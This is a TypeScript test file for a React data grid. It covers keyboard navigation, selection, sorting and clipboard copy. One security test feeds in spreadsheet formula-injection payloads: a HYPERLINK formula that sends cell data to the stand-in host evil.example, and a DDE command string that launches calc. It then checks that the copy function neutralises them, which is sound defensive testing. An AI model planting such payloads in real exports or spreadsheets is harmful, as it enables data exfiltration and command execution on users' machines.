// @vitest-environment jsdom
// REQ-UX-009 keyboard (DESIGN_SYSTEM DS-CMP-10 keyboard table and ARIA; DS-A11Y-11; APG Grid): one tab stop
// with arrow-key cell navigation, Enter on an identifier opens the record, Shift+Arrow cell ranges left
// with Esc, Mod C copies raw tab-separated values, Shift+Space selects the row, headers carry aria-sort.
import { QueryClientProvider } from "@tanstack/react-query";
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { MemoryRouter, useLocation } from "react-router";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";

import { createQueryClient } from "../../app/providers";
import type { ListPage } from "../../lib/api/lists";
import { queryKey } from "../../lib/api/query-keys";
import { registerCurrencies } from "../../lib/format";
import { installGridViewport } from "../../test/layout";
import { DataGrid } from "./DataGrid";
import type { GridColumn, GridSource } from "./types";

installGridViewport();

interface Contract {
  readonly id: string;
  readonly externalId: string;
  readonly customer: string;
  readonly price: string;
}

const ROWS: readonly Contract[] = [
  {
    id: "c-1",
    externalId: "SF-ORD-10001",
    customer: "Pellworth Logistics Inc. (Demo)",
    price: "135000.00",
  },
  {
    id: "c-2",
    externalId: "SF-ORD-10002",
    customer: "Marrowby Health Partners LLC (Demo)",
    price: "240000.00",
  },
  {
    id: "c-3",
    externalId: "SF-ORD-10003",
    customer: "Ulvane Telematics Inc. (Demo)",
    price: "-1200.50",
  },
];

const COLUMNS: readonly GridColumn<Contract>[] = [
  {
    id: "contract",
    header: "Contract",
    kind: "identifier",
    value: (row) => row.externalId,
    href: (row) => `/contracts/${row.id}`,
  },
  { id: "customer", header: "Customer", kind: "text", value: (row) => row.customer },
  {
    id: "price",
    header: "Transaction price",
    kind: "money",
    value: (row) => row.price,
    currency: () => "USD",
    sortKey: "transaction_price",
  },
];

beforeAll(() => {
  registerCurrencies([{ code: "USD", minor_unit: 2 }]);
});

afterEach(() => {
  cleanup();
});

function Probe() {
  const location = useLocation();
  return <output data-testid="location">{`${location.pathname}${location.search}`}</output>;
}

function renderGrid(columns: readonly GridColumn<Contract>[] = COLUMNS) {
  const fetchPage = vi.fn<GridSource<Contract>["fetchPage"]>((): Promise<ListPage<Contract>> =>
    Promise.resolve({ items: ROWS, nextCursor: null, total: { count: 3, capped: false } }),
  );
  render(
    <QueryClientProvider client={createQueryClient()}>
      <MemoryRouter initialEntries={["/contracts"]}>
        <DataGrid
          name="contracts"
          title="Contracts"
          countLabel={(_, formatted) => `${formatted} contracts`}
          columns={columns}
          source={{ queryKey: queryKey("contracts", "tenant"), fetchPage }}
          rowKey={(row) => row.id}
          rowLabel={(row) => row.externalId}
          selectable
        />
        <Probe />
      </MemoryRouter>
    </QueryClientProvider>,
  );
  return fetchPage;
}

function activeElement(): HTMLElement {
  const element = document.activeElement;
  if (!(element instanceof HTMLElement)) {
    throw new Error("Nothing is focused");
  }
  return element;
}

function focusCell(cell: HTMLElement): void {
  fireEvent.mouseDown(cell);
  act(() => cell.focus());
}

function location(): string {
  return screen.getByTestId("location").textContent ?? "";
}

describe("REQ-UX-009 keyboard", () => {
  it("arrow keys move the focused cell inside one tab stop", async () => {
    renderGrid();
    const grid = screen.getByRole("grid", { name: "Contracts" });
    await screen.findByRole("rowheader", { name: "SF-ORD-10001" });
    const tabStops = () => grid.querySelectorAll<HTMLElement>("[tabindex='0']");
    expect(tabStops()).toHaveLength(1);
    act(() => tabStops()[0]?.focus());

    fireEvent.keyDown(activeElement(), { key: "ArrowRight" });
    expect(activeElement()).toBe(screen.getByRole("rowheader", { name: "SF-ORD-10001" }));
    fireEvent.keyDown(activeElement(), { key: "ArrowDown" });
    expect(activeElement()).toBe(screen.getByRole("rowheader", { name: "SF-ORD-10002" }));
    fireEvent.keyDown(activeElement(), { key: "End" });
    expect(activeElement().dataset.cell).toBe("1:3");
    fireEvent.keyDown(activeElement(), { key: "ArrowUp" });
    fireEvent.keyDown(activeElement(), { key: "ArrowUp" });
    expect(activeElement()).toBe(screen.getByRole("columnheader", { name: /^Transaction price/ }));
    fireEvent.keyDown(activeElement(), { key: "Home", ctrlKey: true });
    expect(activeElement().dataset.cell).toBe("0:0");
    expect(tabStops()).toHaveLength(1);
    expect(grid.getAttribute("aria-rowcount")).toBe("4");
    expect(grid.getAttribute("aria-colcount")).toBe("4");
  });

  it("E on a computed cell opens Explain for its row (DS-CMP-15)", async () => {
    const explain = vi.fn<(row: Contract) => void>();
    renderGrid(COLUMNS.map((column) => (column.id === "price" ? { ...column, explain } : column)));
    await screen.findByRole("rowheader", { name: "SF-ORD-10001" });
    const cell = (address: string) => {
      const element = document.querySelector<HTMLElement>(`[data-cell="${address}"]`);
      if (element === null) {
        throw new Error(`No cell ${address}`);
      }
      return element;
    };

    focusCell(cell("0:3"));
    fireEvent.keyDown(cell("0:3"), { key: "e" });
    expect(explain).toHaveBeenCalledWith(ROWS[0]);

    focusCell(cell("0:2"));
    fireEvent.keyDown(cell("0:2"), { key: "e" });
    expect(explain).toHaveBeenCalledTimes(1);
  });

  it("Enter on an identifier opens the record", async () => {
    renderGrid();
    const cell = await screen.findByRole("rowheader", { name: "SF-ORD-10002" });
    focusCell(cell);

    fireEvent.keyDown(cell, { key: "Enter" });

    expect(location()).toBe("/contracts/c-2");
  });

  it("Shift+Arrow extends a cell range, Mod C copies raw values and Esc leaves range mode", async () => {
    const writeText = vi.fn<(text: string) => Promise<void>>(() => Promise.resolve());
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
    renderGrid();
    const grid = screen.getByRole("grid", { name: "Contracts" });
    focusCell(await screen.findByRole("rowheader", { name: "SF-ORD-10001" }));

    fireEvent.keyDown(activeElement(), { key: "ArrowRight", shiftKey: true });
    fireEvent.keyDown(activeElement(), { key: "ArrowDown", shiftKey: true });
    expect(grid.querySelectorAll("[data-in-range]")).toHaveLength(4);
    fireEvent.keyDown(activeElement(), { key: "c", ctrlKey: true });
    expect(writeText).toHaveBeenLastCalledWith(
      "SF-ORD-10001\tPellworth Logistics Inc. (Demo)\nSF-ORD-10002\tMarrowby Health Partners LLC (Demo)",
    );

    fireEvent.keyDown(activeElement(), { key: "Escape" });
    expect(grid.querySelectorAll("[data-in-range]")).toHaveLength(0);
    fireEvent.keyDown(activeElement(), { key: "ArrowDown" });
    fireEvent.keyDown(activeElement(), { key: "ArrowRight" });
    fireEvent.keyDown(activeElement(), { key: "c", metaKey: true });
    expect(writeText).toHaveBeenLastCalledWith("-1200.50");
  });

  it("Mod C neutralises text a spreadsheet would evaluate and keeps a cell one cell (REQ-SEC-011)", async () => {
    const writeText = vi.fn<(text: string) => Promise<void>>(() => Promise.resolve());
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
    const formula = '=HYPERLINK("https://evil.example/?x="&B2,"Open invoice")';
    const hostile: readonly Contract[] = [
      { id: "c-1", externalId: "CUST-0001", customer: formula, price: "-1200.50" },
      {
        id: "c-2",
        externalId: "@SUM(A1:A9)",
        customer: "Marrowby\t=1+1\r\nnext",
        price: "135000.00",
      },
      { id: "c-3", externalId: "-cmd|' /C calc'!A0", customer: "+1+1", price: "240000.00" },
    ];
    render(
      <QueryClientProvider client={createQueryClient()}>
        <MemoryRouter initialEntries={["/contracts"]}>
          <DataGrid
            name="contracts"
            title="Contracts"
            countLabel={(_, formatted) => `${formatted} contracts`}
            columns={COLUMNS}
            source={{
              queryKey: queryKey("contracts", "tenant"),
              fetchPage: () =>
                Promise.resolve({
                  items: hostile,
                  nextCursor: null,
                  total: { count: 3, capped: false },
                }),
            }}
            rowKey={(row) => row.id}
            rowLabel={(row) => row.externalId}
            selectable
          />
        </MemoryRouter>
      </QueryClientProvider>,
    );
    focusCell(await screen.findByRole("rowheader", { name: "CUST-0001" }));

    // A cell range: three rows by three columns.
    fireEvent.keyDown(activeElement(), { key: "ArrowRight", shiftKey: true });
    fireEvent.keyDown(activeElement(), { key: "ArrowRight", shiftKey: true });
    fireEvent.keyDown(activeElement(), { key: "ArrowDown", shiftKey: true });
    fireEvent.keyDown(activeElement(), { key: "ArrowDown", shiftKey: true });
    fireEvent.keyDown(activeElement(), { key: "c", ctrlKey: true });
    expect(writeText).toHaveBeenLastCalledWith(
      [
        // The negative amount of a money column stays a number (positive control).
        `CUST-0001\t'${formula}\t-1200.50`,
        // An embedded tab or line break no longer starts a new cell.
        "'@SUM(A1:A9)\tMarrowby =1+1 next\t135000.00",
        "'-cmd|' /C calc'!A0\t'+1+1\t240000.00",
      ].join("\n"),
    );
    for (const line of (writeText.mock.lastCall?.[0] ?? "").split("\n")) {
      expect(line.split("\t")).toHaveLength(3);
    }

    // Whole rows: the header line and the same cells.
    fireEvent.keyDown(activeElement(), { key: "Escape" });
    fireEvent.keyDown(activeElement(), { key: " ", shiftKey: true });
    fireEvent.keyDown(activeElement(), { key: "c", ctrlKey: true });
    expect(writeText).toHaveBeenLastCalledWith(
      ["Contract\tCustomer\tTransaction price", "'-cmd|' /C calc'!A0\t'+1+1\t240000.00"].join("\n"),
    );
  });

  it("Shift+Space selects the focused row", async () => {
    renderGrid();
    const cell = await screen.findByRole("rowheader", { name: "SF-ORD-10003" });
    const row = screen.getByRole("row", { name: /SF-ORD-10003/ });
    expect(row.getAttribute("aria-selected")).toBe("false");
    focusCell(cell);

    fireEvent.keyDown(cell, { key: " ", shiftKey: true });

    expect(row.getAttribute("aria-selected")).toBe("true");
    expect(screen.getByRole("region", { name: "1 selected" })).toBeTruthy();
    expect(
      screen.getByRole("grid", { name: "Contracts" }).getAttribute("aria-multiselectable"),
    ).toBe("true");
  });

  it("sortable headers carry aria-sort and Enter cycles the server-side sort", async () => {
    const fetchPage = renderGrid();
    const header = await screen.findByRole("columnheader", { name: /^Transaction price/ });
    expect(header.getAttribute("aria-sort")).toBe("none");
    expect(screen.getByRole("columnheader", { name: /^Contract/ }).hasAttribute("aria-sort")).toBe(
      false,
    );
    focusCell(header);

    fireEvent.keyDown(header, { key: "Enter" });
    expect(location()).toBe("/contracts?sort=transaction_price");
    await waitFor(() => expect(fetchPage).toHaveBeenLastCalledWith(null, "transaction_price"));
    expect(header.getAttribute("aria-sort")).toBe("ascending");

    fireEvent.keyDown(header, { key: "Enter" });
    expect(location()).toBe("/contracts?sort=-transaction_price");
    await waitFor(() => expect(fetchPage).toHaveBeenLastCalledWith(null, "-transaction_price"));
    expect(header.getAttribute("aria-sort")).toBe("descending");
  });
});
